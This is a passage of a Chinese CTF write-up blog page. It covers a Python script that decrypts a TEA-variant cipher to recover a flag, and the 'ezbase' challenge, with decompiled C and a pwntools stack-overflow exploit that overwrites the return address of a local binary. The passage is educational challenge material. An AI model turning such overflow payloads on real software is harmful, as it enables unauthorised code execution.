class="number">0xCAFEBABEFACEB00C</span>]</span><br><span class="line">result = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;18I&#x27;</span>, <span class="built_in">bytearray</span>(result)))</span><br><span class="line">key = struct.pack(<span class="string">&#x27;&lt;2Q&#x27;</span>, *key)</span><br><span class="line">key = <span class="built_in">list</span>(struct.unpack(<span class="string">&#x27;&lt;4I&#x27;</span>, key))</span><br><span class="line">flag = []  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_dec</span>(<span class="params">cipher, key</span>):  </span><br><span class="line">    num = (-<span class="number">0x61C88647</span> * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):  </span><br><span class="line">        cipher[<span class="number">1</span>] -= ((((cipher[<span class="number">0</span>] &gt;&gt; <span class="number">5</span>) ^ (cipher[<span class="number">0</span>] &lt;&lt; <span class="number">4</span>)) + cipher[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>) ^ ((key[(num &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + num) &amp; <span class="number">0xFFFFFFFF</span>)  </span><br><span class="line">        cipher[<span class="number">1</span>] &amp;= <span class="number">0xFFFFFFFF</span>  </span><br><span class="line">        num = (num + <span class="number">0x61C88647</span>) &amp; <span class="number">0xFFFFFFFF</span>  </span><br><span class="line">        cipher[<span class="number">0</span>] -= ((((cipher[<span class="number">1</span>] &gt;&gt; <span class="number">5</span>) ^ (cipher[<span class="number">1</span>] &lt;&lt; <span class="number">4</span>)) + cipher[<span class="number">1</span>]) &amp; <span class="number">0xffffffff</span>) ^ ((key[num &amp; <span class="number">3</span>] + num) &amp; <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">        cipher[<span class="number">0</span>] &amp;= <span class="number">0xFFFFFFFF</span>  </span><br><span class="line">    <span class="keyword">return</span> cipher  </span><br><span class="line"></span><br><span class="line">content = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result), <span class="number">2</span>):  </span><br><span class="line">    content += tea_dec(result[i:i + <span class="number">2</span>], key)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):  </span><br><span class="line">    flag += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, content[i])  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(flag).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>(flag).replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;&#x27;</span>).decode())</span><br><span class="line"><span class="comment"># DASCTF&#123;Don&#x27;t_forget_to_drink_tea&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="ezbase"><a href="#ezbase" class="headerlink" title="ezbase"></a>ezbase</h2><p>栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_404986</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	......</span><br><span class="line">    sub_4D8C40(<span class="string">&quot;This is a easy and joy de/en base64 elf&quot;</span>);</span><br><span class="line">    sub_4D8C40(<span class="string">&quot;You have two choices: \n1:encode\n2:decode&quot;</span>);</span><br><span class="line">    sub_454520(qword_5C85E0, &amp;v8);</span><br><span class="line">    <span class="built_in">memset</span>(str_input, <span class="number">0</span>, <span class="keyword">sizeof</span>(str_input));</span><br><span class="line">    LODWORD(v6) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_4D1670(<span class="string">&quot;cin de_str:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(qword_5C85E0, output_);</span><br><span class="line">        sub_404245(output_, str_input);</span><br><span class="line">        v1 = sub_470BC0(qword_5C84C0, str_input, v0);</span><br><span class="line">        sub_46F650(v1, sub_470510);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        sub_4D1670(<span class="string">&quot;cin en_str:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(qword_5C85E0, str_input);</span><br><span class="line">        sub_404635(str_input, output_);</span><br><span class="line">        v3 = sub_470BC0(qword_5C84C0, output_, v2);</span><br><span class="line">        sub_46F650(v3, sub_470510);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>改变返回地址到这，不知道为啥<code>0ex40490d</code>不行，用的<code>0x404911</code>：</p>
<p><img src="/2023/12/24/CTF-wp-4/image-20231220113550055.png"></p>
<p>EXP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./base&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;2:decode&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;cin de_str:&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;1234&#x27;</span> * <span class="number">8</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x40490D</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://hahbiubiubiu.github.io">hahbiubiubiu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://hahbiubiubiu.github.io/2023/12/24/CTF-wp-4/">http://hahbiubiubiu.github.io/2023/12/24/CTF-wp-4/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hahbiubiubiu.github.io" target="_blank">hahbiubiubiu</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Reverse/">Reverse</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/./img/preview.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/12/24/CTF-wp-5/"><img class="prev-cover" src="/./img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">CTF-WP-5</div></div></a></div><div class="next-post pull-right"><a href="/2023/12/24/CTF-wp-3/"><img class="next-cover" src="/./img/preview.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">CTF-WP-3</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/10/04/Bingo%E2%80%94%E2%80%94bugku/" title="Bingo——bugku"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-04</div><div class="title">Bingo——bugku</div></div></a></div><div><a href="/2023/06/23/DASCTF2023%E4%BA%8C%E8%BF%9B%E5%88%B6/" title="DASCTF2023二进制"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-23</div><div class="title">DASCTF2023二进制</div></div></a></div><div><a href="/2023/03/23/QExtend/" title="QExtend-300"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-23</div><div class="title">QExtend-300</div></div></a></div><div><a href="/2022/11/18/SCU2022%E6%96%B0%E7%94%9F%E8%B5%9B/" title="SCU2022新生赛"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-18</div><div class="title">SCU2022新生赛</div></div></a></div><div><a href="/2022/10/03/babyLoginPlus-bugku/" title="babyLoginPlus——bugku"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-03</div><div class="title">babyLoginPlus——bugku</div></div></a></div><div><a href="/2023/05/07/d3ctf2023%E5%AD%A6%E4%B9%A0/" title="d3ctf2023学习"><img class="cover" src="/./img/preview.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-07</div><div class="title">d3ctf2023学习</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/./img/Valkyrie.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">hahbiubiubiu</div><div class="author-info__description">派派玩家搞搞震</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/hahbiubiubiu"><i class="fab fa-github"></i><span>biubiaboom</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/965116991@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Hello!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TPCTF2023"><span class="toc-number">1.</span> <span class="toc-text">TPCTF2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nanPyEnc"><span class="toc-number">1.1.</span> <span class="toc-text">nanPyEnc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#maze"><span class="toc-number">1.2.</span> <span class="toc-text">maze</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E5%8E%8B%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.1.</span> <span class="toc-text">解压可执行文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#maze-so"><span class="toc-number">1.2.2.</span> <span class="toc-text">maze.so</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#run"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">run</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solve"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">solve</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">1.2.3.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mazelang"><span class="toc-number">1.2.4.</span> <span class="toc-text">Mazelang</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#funky"><span class="toc-number">1.3.</span> <span class="toc-text">funky</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#enc1"><span class="toc-number">1.3.1.</span> <span class="toc-text">enc1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enc2"><span class="toc-number">1.3.2.</span> <span class="toc-text">enc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#enc3"><span class="toc-number">1.3.3.</span> <span class="toc-text">enc3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.4.</span> <span class="toc-text">脚本</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="toc-number">2.</span> <span class="toc-text">强网杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyre"><span class="toc-number">2.1.</span> <span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezre"><span class="toc-number">2.2.</span> <span class="toc-text">ezre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezre-1"><span class="toc-number">2.3.</span> <span class="toc-text">ezre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dotdot"><span class="toc-number">2.4.</span> <span class="toc-text">dotdot</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A5%9A%E6%85%A7%E6%9D%AF2023"><span class="toc-number">3.</span> <span class="toc-text">楚慧杯2023</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#babyre-1"><span class="toc-number">3.1.</span> <span class="toc-text">babyre</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezbase"><span class="toc-number">3.2.</span> <span class="toc-text">ezbase</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/CTF-wp-5/" title="CTF-WP-5"><img src="/./img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-WP-5"/></a><div class="content"><a class="title" href="/2023/12/24/CTF-wp-5/" title="CTF-WP-5">CTF-WP-5</a><time datetime="2023-12-24T06:15:07.046Z" title="发表于 2023-12-24 14:15:07">2023-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/CTF-wp-4/" title="CTF-WP-4"><img src="/./img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-WP-4"/></a><div class="content"><a class="title" href="/2023/12/24/CTF-wp-4/" title="CTF-WP-4">CTF-WP-4</a><time datetime="2023-12-24T06:15:07.043Z" title="发表于 2023-12-24 14:15:07">2023-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/24/CTF-wp-3/" title="CTF-WP-3"><img src="/./img/preview.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CTF-WP-3"/></a><div class="content"><a class="title" href="/2023/12/24/CTF-wp-3/" title="CTF-WP-3">CTF-WP-3</a><time datetime="2023-12-24T06:15:07.041Z" title="发表于 2023-12-24 14:15:07">2023-12-24</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By hahbiubiubiu</div><div class="footer_custom_text">hahahahah biubiubiu boomboomboom</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"]):not([href="/music/"]):not([href="/no-pjax/"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>